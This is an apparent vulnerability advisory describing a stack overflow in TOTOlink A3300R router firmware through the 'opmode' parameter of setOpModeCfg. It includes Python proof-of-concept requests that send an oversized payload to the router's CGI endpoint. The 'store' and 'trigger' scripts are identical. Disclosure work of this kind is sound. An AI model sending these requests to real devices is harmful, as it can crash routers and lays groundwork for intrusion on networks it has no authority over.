## Summary

A stack overflow vulnerability exists in the TOTOlink A3300R firmware. The `opmode` POST parameter accepted by `setOpModeCfg` function is written to the configuration key `opmode_custom` via `Uci_Set_Str` without length or content validation. The stored value is later read via `setOpModeCfg`function and stored on the stack. Since there is no limit on the length of the stored value, it can lead to stack overflow.

## Affected product & version

- Device: TOTOlink A3300R
- Firmware Version: V17.0.0cu.557_B20221024
- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

## Vulnerability type

- **Type**:Stack overflow
- **Root cause:** Missing input validation / insufficient sanitization and lack of length checks in `Uci_Set_Str` and `Uci_Get_Str` functions that handle `opmode_custom`.

## Vulnerability details

The `setOpModeCfg` endpoint accepts a POST parameter `opmode` and calls `Uci_Set_Str(11, "opmode", "opmode_custom", v3)` without enforcing a maximum length.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_125923.png)

The `setOpModeCfg` endpoint retrieves the `opmode_custom` parameter using `Uci_Get_Str(11, "opmode", "opmode_custom", v18)` and stores it on the stack without proper boundary checks, which may result in a stack overflow vulnerability.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_130134.png)

## POC

1. **Store `opmode_custom` **

```python
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
payload = b"a"*0x1000
data = {"topicurl":"setOpModeCfg","opmode":payload}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
```

2. **Trigger**

```python
import requests
url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
payload = b"a"*0x1000
data = {"topicurl":"setOpModeCfg","opmode":payload}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
```

3. **result**

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_114256.png)

